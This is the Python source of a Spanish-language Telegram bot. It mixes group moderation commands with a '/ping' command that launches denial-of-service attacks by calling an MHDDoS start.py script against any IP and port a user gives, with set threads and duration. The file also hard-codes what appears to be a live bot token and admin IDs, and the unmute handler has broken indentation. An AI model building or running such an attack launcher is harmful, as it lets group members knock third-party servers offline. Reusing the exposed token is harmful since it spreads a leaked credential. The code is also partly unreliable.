import telebot
import subprocess
import time
import logging
from threading import Lock
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatPermissions

# Configuración básica
logging.basicConfig(level=logging.INFO)
BOT_TOKEN = "7692852873:AAHQ3YtPu90LarVnzyPRd4695zPDKY8taOQ"
ADMIN_ID = 6348583777
GROUP_ID = -1002260050481
GROUP_LINK = "https://t.me/zFerCrashGoup"
START_PY_PATH = "/workspaces/MHDDoS/start.py"

# Inicialización del bot
bot = telebot.TeleBot(BOT_TOKEN)
cooldowns = {}
active_attacks = {}
blocked_words = set(["palabra1", "palabra2"])  # Usando conjunto para mejor performance
hidden_links = {}
muted_users = {}
db_lock = Lock()

# ================= FUNCIONES AUXILIARES =================
def is_allowed(message):
    """Verifica si el usuario tiene acceso al bot"""
    return message.chat.id == GROUP_ID or (message.chat.type == "private" and message.from_user.id == ADMIN_ID)

def is_admin(chat_id, user_id):
    """Verifica si un usuario es administrador"""
    try:
        chat_member = bot.get_chat_member(chat_id, user_id)
        return chat_member.status in ["administrator", "creator"]
    except Exception as e:
        logging.error(f"Error verificando admin: {e}")
        return False

def check_muted_users():
    """Elimina usuarios cuyo mute haya expirado"""
    current_time = time.time()
    expired = [user_id for user_id, end_time in muted_users.items() if end_time < current_time]
    for user_id in expired:
        del muted_users[user_id]

# ================= HANDLERS PRINCIPALES =================
@bot.message_handler(commands=["start", "menu", "admin"])
def handle_menu(message):
    if not is_allowed(message):
        return

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚫 Bloquear palabra", callback_data="block_word"),
        InlineKeyboardButton("🔓 Aprobar enlaces", callback_data="approve_link"),
        InlineKeyboardButton("👥 Listar admins", callback_data="list_admins"),
        InlineKeyboardButton("⚡ Iniciar Ping", callback_data="start_ping"),
        InlineKeyboardButton("🧹 Limpiar mensajes", callback_data="clean_chat")
    )
    bot.send_message(
        message.chat.id,
        "🤖 *Menú de Administración* 🤖\n\nSelecciona una opción:",
        reply_markup=markup,
        parse_mode="Markdown"
    )


@bot.message_handler(commands=["ping"])
def handle_ping(message):
    if not is_allowed(message):
        return

    try:
        # Verificar cooldown
        user_id = message.from_user.id
        if user_id in cooldowns and time.time() - cooldowns[user_id] < 20:
            bot.reply_to(message, "⏳ Espere 20 segundos antes de otro ataque")
            return

        # Validar formato del comando
        args = message.text.split()
        if len(args) != 5 or ":" not in args[2]:
            raise ValueError("Formato inválido")

        attack_type, ip_port, threads, duration = args[1], args[2], args[3], args[4]
        
        # Ejecutar ataque
        with db_lock:
            process = subprocess.Popen(
                ["python", START_PY_PATH, attack_type, ip_port, threads, duration],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            active_attacks[user_id] = process
            cooldowns[user_id] = time.time()

        # Respuesta con botón de parar
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ Parar Ataque", callback_data=f"stop_{user_id}"))
        
        bot.reply_to(
            message,
            f"🔥 *Ataque Iniciado* 🔥\n\n"
            f"📍 IP: `{ip_port}`\n"
            f"⚙️ Tipo: {attack_type}\n"
            f"🧵 Threads: {threads}\n"
            f"⏳ Duración: {duration}ms",
            reply_markup=markup,
            parse_mode="Markdown"
        )

    except Exception as e:
        logging.error(f"Error en ping: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    user_id = int(call.data.split("_")[1])
    if call.from_user.id != user_id:
        bot.answer_callback_query(call.id, "❌ Solo el que inicio el ataque lo puede parar")
        return

    if user_id in active_attacks:
        try:
            active_attacks[user_id].terminate()
            del active_attacks[user_id]
            bot.answer_callback_query(call.id, "✅ Ataque detenido")
            bot.edit_message_text(
                "🛑 *Ataque Detenido* 🛑",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode="Markdown"
            )
        except Exception as e:
            logging.error(f"Error deteniendo ataque: {e}")
            bot.answer_callback_query(call.id, "❌ Error al detener")

# ================= MODERACIÓN =================
@bot.message_handler(commands=["mute"])
def handle_mute(message):
    if not is_admin(message.chat.id, message.from_user.id):
        bot.reply_to(message, "❌ Comando solo para admins")
        return

    try:
        args = message.text.split()
        if not message.reply_to_message or len(args) < 2:
            raise ValueError("Responde a un usuario y especifica tiempo en minutos")
        
        user_id = message.reply_to_message.from_user.id
        mute_minutes = int(args[1])
        end_time = time.time() + (mute_minutes * 60)
        
        muted_users[user_id] = end_time
        bot.restrict_chat_member(
            message.chat.id,
            user_id,
            ChatPermissions(can_send_messages=False),
            until_date=end_time
        )
        bot.reply_to(message, f"🔇 Usuario muteado por {mute_minutes} minutos")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=["unmute"])
def handle_unmute(message):
    if not is_admin(message.chat.id, message.from_user.id):
        return

    if message.reply_to_message:
    user_id = message.reply_to_message.from_user.id
    if user_id in muted_users:
        del muted_users[user_id]
        bot.restrict_chat_member(
            message.chat.id,
            user_id,
            ChatPermissions(can_send_messages=True)
        )
        bot.reply_to(message, "🔊 Usuario desmuteado")
        
@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    if not is_allowed(message):
        return

    check_muted_users()  # Limpiar mutes expirados
    
    # Si el usuario está muteado
    if message.from_user.id in muted_users:
        bot.delete_message(message.chat.id, message.message_id)
        return

    text = message.text.lower()
    
    # Detectar palabras bloqueadas
    if any(word in text for word in blocked_words):
        bot.delete_message(message.chat.id, message.message_id)
        bot.reply_to(message, "❌ Mensaje contiene palabra prohibida")
        return

    # Detectar enlaces
    if "http" in text:
        link_id = str(message.message_id)
        hidden_links[link_id] = {
            "text": message.text,
            "user": message.from_user.id,
            "timestamp": time.time()
        }
        bot.delete_message(message.chat.id, message.message_id)
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("👁️ Mostrar Enlace", callback_data=f"show_{link_id}"))
        bot.send_message(
            message.chat.id,
            "🔒 Enlace oculto - Solo visible para admins",
            reply_markup=markup
        )

# ================= COMANDOS ADICIONALES =================
@bot.message_handler(commands=["help"])
def handle_help(message):
    logging.info("Comando /help recibido")
    help_text = (
        "🛠️ *Comandos Disponibles:*\n\n"
        "⚙️ Administración:\n"
        "/menu - Panel de control\n"
        "/mute <minutos> - Silenciar usuario\n"
        "/unmute - Desilenciar\n"
        "/clean <cantidad> - Limpiar mensajes\n\n"
        "🔧 Herramientas:\n"
        "/ping - Iniciar ataque\n"
        "/id - Ver tu ID\n"
        "/help - Esta ayuda"
    )
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=["clean"])
def handle_clean(message):
    if not is_admin(message.chat.id, message.from_user.id):
        return

    try:
        args = message.text.split()
        limit = int(args[1]) if len(args) > 1 else 10
        for msg_id in range(message.message_id, message.message_id - limit, -1):
            try:
                bot.delete_message(message.chat.id, msg_id)
            except:
                pass
        bot.reply_to(message, f"🧹 {limit} mensajes limpiados")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=["id"])
def handle_id(message):
    bot.reply_to(message, f"🆔 Tu ID: `{message.from_user.id}`", parse_mode="Markdown")

# ================= EJECUCIÓN =================
if __name__ == "__main__":
    logging.info("Bot iniciado")
    bot.infinity_polling()
